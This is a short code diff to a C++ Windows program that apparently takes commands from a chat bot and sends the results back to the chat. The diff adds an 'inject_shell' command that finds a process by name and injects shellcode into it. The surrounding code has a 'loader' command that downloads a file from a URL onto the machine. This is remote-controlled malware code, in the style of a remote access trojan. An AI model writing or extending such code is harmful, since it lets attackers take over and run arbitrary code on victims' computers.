@@ -163,6 +163,23 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
 					}
 				}
 
+				// inject_shell
+				else if (params[0] == "inject_shell") {
+					DWORD pid = PIDByName(params[1]);
+					if (pid != 0) {
+						if (InjectShell(pid, params[2])) {
+							api.SendTextMessage(s.chatid, "Success! Shellcode is injected");
+						}
+						else {
+							api.SendTextMessage(s.chatid, "Error! Shellcode isn't injected");
+						}
+					}
+					else {
+						api.SendTextMessage(s.chatid, "Error! Process not found");
+					}
+				}
+
+				// AUXILIARY
 				// loader https://google.com C:\File.exe
 				else if (params[0] == "loader") {
 					URLDownloadToFileA(0, params[1].c_str(), params[2].c_str(), 0, 0);
